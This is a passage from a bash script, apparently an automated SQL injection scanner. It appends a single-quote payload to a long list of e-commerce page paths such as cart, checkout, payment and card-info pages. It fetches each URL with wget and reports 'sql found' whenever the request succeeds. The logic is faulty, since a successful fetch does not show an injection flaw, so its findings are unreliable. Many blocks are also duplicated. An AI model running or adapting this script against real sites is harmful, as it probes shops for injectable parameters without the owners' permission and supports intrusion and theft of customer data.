wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/add-to-cart.php?ID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/addToCart.php?idProduct='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/addToCart.php?idProduct='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/adminEditProductFields.php?intProdID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/advSearch_h.php?idCategory='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/affiliate-agreement.cfm?storeid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/affiliates.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/ancillary.php?ID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/archive.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/article.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/phpx?PageID'"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/basket.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/Book.php?bookID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/book_list.php?bookid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/book_view.php?bookid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/BookDetails.php?ID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/browse.php?catid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/browse_item_details.php'"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/Browse_Item_Details.php?Store_Id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/buy.php?'"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/buy.php?bookid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/
bycategory.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/cardinfo.php?card='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/cart.php?action='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/cart.php?cart_id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/cart.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/cart_additem.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/cart_validate.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/cartadd.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/cat.php?iCat='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/catalog.php'"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/catalog.php?CatalogID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/catalog_item.php?ID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/catalog_main.php?catid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/category.php'"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/category.php?catid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/category_list.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/categorydisplay.php?catid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/categorydisplay.php?catid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/checkout.php?UserID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/checkout_confirmed.php?order_id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
		echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/checkout1.php?cartid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/comersus_listCategoriesAndProducts.php?idCategory='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/comersus_optEmailToFriendForm.php?idProduct='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/comersus_optReviewReadExec.php?idProduct='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/comersus_viewItem.php?idProduct='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/comments_form.php?ID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/contact.php?cartId='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/content.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/customerService.php?****ID1='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/default.php?catID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/description.php?bookid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/details.php?BookID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/details.php?Press_Release_ID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/details.php?Product_ID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/display_item.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/details.php?Service_ID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/displayproducts.php'"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/downloadTrial.php?intProdID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/emailproduct.php?itemid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/emailToFriend.php?idProduct='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/events.php?ID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/faq.php?cartID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/faq_list.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/faqs.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/feedback.php?title='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/freedownload.php?bookid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/fullDisplay.php?item='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/getbook.php?bookid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/GetItems.php?itemid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/giftDetail.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/help.php?CartId='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/home.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?cart='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?cartID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?ID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/info.php?ID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/item.php?eid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/item.php?item_id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/item.php?itemid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/item.php?model='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/item.php?prodtype='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/item.php?shopcd='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/item_list.php?maingroup'"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/item_show.php?code_no='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/itemDesc.php?CartId='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/itemdetail.php?item='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/itemdetails.php?catalogid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/itemdetails.php?catalogid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/itemdetails.php?catalogid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/itemdetails.php?catalogid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/itemdetails.php?catalogid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/listcategoriesandproducts.php?idCategory='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then        
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/modline.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/myaccount.php?catid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/myaccount.php?catid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/news.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/order.php?BookID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/order.php?id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/page.php?PartID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/payment.php?CartID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/pdetail.php?item_id='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/powersearch.php?CartId='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/price.php'"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/privacy.php?cartID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/prodbycat.php?intCatalogID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/prodetails.php?prodid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/prodlist.php?catid='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/product.php?bookID='"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > sql found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/product.php?intProdID='"
c=$b$d
